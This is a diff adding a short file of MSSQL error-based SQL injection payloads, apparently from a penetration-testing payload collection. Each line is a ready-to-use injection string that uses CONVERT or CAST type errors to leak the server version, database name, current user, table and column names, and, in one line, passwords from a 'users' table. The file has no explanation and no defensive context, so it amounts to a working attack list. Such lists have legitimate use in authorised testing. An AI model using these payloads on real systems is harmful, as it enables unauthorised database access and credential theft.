@@ -1,0 +1,17 @@
+# MSSQL — Error-Based Payloads
+
+# --- CONVERT errors (most reliable) ---
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
+' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
+' AND 1=CONVERT(int,db_name())--
+' AND 1=CONVERT(int,system_user)--
+
+# --- CAST errors ---
+' AND 1=CAST(@@version AS int)--
+' AND 1=CAST(db_name() AS int)--
+' AND 1=CAST(system_user AS int)--
+
+# --- Error via subquery ---
+' AND 1=(SELECT TOP 1 CAST(name AS int) FROM sysobjects WHERE xtype='U')--
